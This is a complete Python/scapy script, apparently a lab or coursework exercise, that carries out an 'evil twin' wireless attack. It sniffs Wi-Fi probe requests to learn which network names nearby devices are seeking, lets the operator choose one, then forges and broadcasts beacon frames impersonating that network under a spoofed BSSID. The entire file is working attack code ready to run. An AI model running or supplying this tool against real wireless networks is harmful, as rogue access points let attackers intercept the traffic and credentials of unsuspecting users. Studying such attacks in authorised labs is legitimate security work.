#!/bin/python3
import argparse

import netifaces
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11ProbeReq

SSIDs = []


def packet_handler(p):
    """
    Packet handler to analyse active Probe requests and discover new ssids
    :param p: the packet to analyse
    """
    if p.haslayer(Dot11ProbeReq):
        ssid = p.info.decode("utf-8")
        # Null probe requests are discarded
        if ssid != "" and ssid not in SSIDs:
            SSIDs.append(ssid)
            print(ssid)


def search_ssid():
    """
    Sniff for active probe request in the proximity
    :return:
    """
    print("<SSID>")
    sniff(iface=args.Interface, prn=packet_handler, timeout=args.Timeout)


def select_ssid():
    """
    Ask user to choose a SSID
    :return: the selected SSID
    """
    user_ssid = input("Please select the SSID:\n")
    print("You selected the SSID:", user_ssid)
    return user_ssid


def forge_packet(ssid):
    """
    Forge a Beacon frame based on the user selected SSID
    :param ssid: the SSID of the packet to forge
    :return: the forged packet
    """

    # fix channel to 11
    channel = 11

    interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]

    # forge beacon packet
    packet = RadioTap() \
             / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=interface[0]['addr'], addr3=interface[0]['addr'] if not args.BSSID else args.BSSID) \
             / Dot11Beacon(cap="ESS+privacy") \
             / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) \
             / Dot11Elt(ID="DSset", info=chr(channel))

    # show the forged packet
    print("forged packet:")
    packet.show()
    return packet


def evil_twin_probe_request():
    """
    Perform the evil twin fake channel attack
    :return:
    """
    search_ssid()
    if len(SSIDs) != 0:
        selected_ssid = select_ssid()
        forged_beacon = forge_packet(selected_ssid)
        sendp(forged_beacon, iface=args.Interface, count=int(args.Packets))
    else:
        print("No SSIDs found in active probe requests...Try again...")


# Args parsing
parser = argparse.ArgumentParser(prog="Scapy Fake channel Evil Tween attack",
                                 usage="evil_twin_probe_request.py -i wlp2s0mon -b 00:11:22:33:44:55 [-t 10 -n 10]",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to use, needs to be set to monitor mode")
parser.add_argument("-b", "--BSSID", required=False,
                    help="The BSSID of the AP for the new network (Will default to interface's mac if not specified)",
                    default="")
parser.add_argument("-t", "--Timeout", required=False, help="The time in seconds to wait before stopping the sniffing",
                    default=10)
parser.add_argument("-n", "--Packets", required=False, help="The number of packets to send", default=10)

args = parser.parse_args()

# start the attack
evil_twin_probe_request()
